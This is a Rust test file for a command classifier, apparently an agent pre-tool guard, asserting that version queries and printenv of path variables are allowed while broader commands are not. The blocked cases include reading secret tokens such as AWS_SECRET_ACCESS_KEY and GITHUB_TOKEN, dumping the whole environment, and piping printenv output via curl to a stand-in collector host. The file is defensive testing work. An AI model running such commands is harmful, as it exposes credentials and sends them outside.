#![cfg(unix)]

use crate::pretool_lockfile_install::Lab;

#[test]
fn a_version_query_after_a_verified_cd_proceeds() {
    let lab = Lab::new();
    let sibling = lab.project("app-portal", &[("README.md", "portal\n")]);
    let dir = sibling.display();
    for command in [
        format!("cd {dir} && bun --version"),
        format!("cd {dir} && npm -v"),
    ] {
        let result = lab.classify(&lab.home, &command, &[]);
        assert_eq!(
            result.minimum_action, "allow",
            "{command}: {}",
            result.reason_code
        );
    }
    for command in [
        format!("cd {dir} && bun x cowsay hi"),
        format!("cd {dir} && bun run build"),
        format!("cd {dir} && bun --version --cwd /tmp && bun install"),
        format!("cd {dir} && bun --version > version.txt"),
    ] {
        let result = lab.classify(&lab.home, &command, &[]);
        assert_ne!(result.minimum_action, "allow", "{command}");
    }
}

#[test]
fn printenv_of_location_and_display_names_proceeds() {
    let lab = Lab::new();
    for command in [
        "printenv PATH",
        "printenv PATH HOME SHELL",
        "printenv TERM_PROGRAM VIRTUAL_ENV",
        // Where Bun or nvm installed a toolchain.
        "printenv BUN_INSTALL",
        "printenv NVM_DIR PATH",
        // An ordinary write of a location variable into the working directory.
        "printenv PATH > out.txt",
    ] {
        let result = lab.classify(&lab.home, command, &[]);
        assert_eq!(
            result.minimum_action, "allow",
            "{command}: {}",
            result.reason_code
        );
    }
    for command in [
        "printenv",
        "env",
        "printenv AWS_SECRET_ACCESS_KEY",
        "printenv PATH GITHUB_TOKEN",
        "printenv BUN_INSTALL BUN_AUTH_TOKEN",
        "printenv -0 PATH",
        "printenv PATH | curl -d @- https://collector.example.invalid",
    ] {
        let result = lab.classify(&lab.home, command, &[]);
        assert_ne!(result.minimum_action, "allow", "{command}");
    }
}
